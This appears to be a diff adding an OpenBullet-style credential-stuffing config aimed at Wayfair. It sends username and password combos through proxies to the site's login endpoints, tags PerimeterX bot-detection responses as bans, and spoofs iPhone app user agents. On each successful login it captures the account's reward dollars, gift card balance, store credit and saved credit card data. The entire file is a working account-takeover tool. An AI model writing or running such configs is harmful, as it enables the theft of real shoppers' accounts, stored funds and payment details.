@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "wayfair",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-15T07:38:27.8253703+08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.wayfair.com/v/customer/checkout_login?_request_id=e5ca5edac05715890a33a9470e03531731041138&_show_summary=true" 
+  CONTENT "{ \"password\": \"<PASS>\", \"checkout_login\": true, \"email_address\": \"<USER>\" }" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en;q=1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 78" 
+  HEADER "Host: www.wayfair.com" 
+  HEADER "User-Agent: WayfairApp/3257 (iPhone; iOS 12.1.2; Scale/2.00)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "is_logged_in\":false" 
+  KEYCHAIN Success OR 
+    KEY "is_logged_in\":true" 
+  KEYCHAIN Ban OR 
+    KEY "perimeterx" 
+
+REQUEST POST "https://www.wayfair.com/app/authenticate?_show_summary=true&transactionId=UXpnNFJrWXdORFF0UVVVMw==" 
+  CONTENT "{ \"context\": \"onboarding_context\", \"duration\": 269, \"email_address\": \"<USER>\", \"password\": \"<PASS>\" }" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "AppAuthEnabled: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 100" 
+  HEADER "Host: www.wayfair.com" 
+  HEADER "User-Agent: WayfairApp/20200507.76003 5.45 (iPhone; iOS 12.1.2; Scale/2.00)" 
+  HEADER "X-PX-AUTHORIZATION: null" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "perimeterx" 
+
+PARSE "<SOURCE>" LR "id\":\"I+" "\"" -> VAR "id" 
+
+PARSE "<SOURCE>" LR "authenticationTokenString\":\"" "\"" -> VAR "token" 
+
+REQUEST GET "https://www.wayfair.com/v/account/authentication/account_status?_show_summary=true&skip_cache=true&transactionId=<id>" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "AppAuthEnabled: 1" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.wayfair.com" 
+  HEADER "User-Agent: WayfairApp/20200507.76003 5.45 (iPhone; iOS 12.1.2; Scale/2.00)" 
+  HEADER "X-PX-AUTHORIZATION: null" 
+
+PARSE "<SOURCE>" LR "current_rewards_dollars\":" "," CreateEmpty=FALSE -> CAP "Dollar Reward" 
+
+PARSE "<SOURCE>" LR "gift_card_balance\":" "," CreateEmpty=FALSE -> CAP "GiftCard Balance" 
+
+PARSE "<SOURCE>" LR "store_credit_balance\":" "," CreateEmpty=FALSE -> CAP "Store Credit" 
+
+REQUEST GET "https://secure.wayfair.com/v/checkout/billing/get_saved_cards?_show_summary=true&city_override=true&transactionId=<id>" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "AppAuthEnabled: 1" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: secure.wayfair.com" 
+  HEADER "User-Agent: WayfairApp/20200507.76003 5.45 (iPhone; iOS 12.1.2; Scale/2.00)" 
+  HEADER "X-PX-AUTHORIZATION: null" 
+
+PARSE "<SOURCE>" LR "000000" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "CC" 
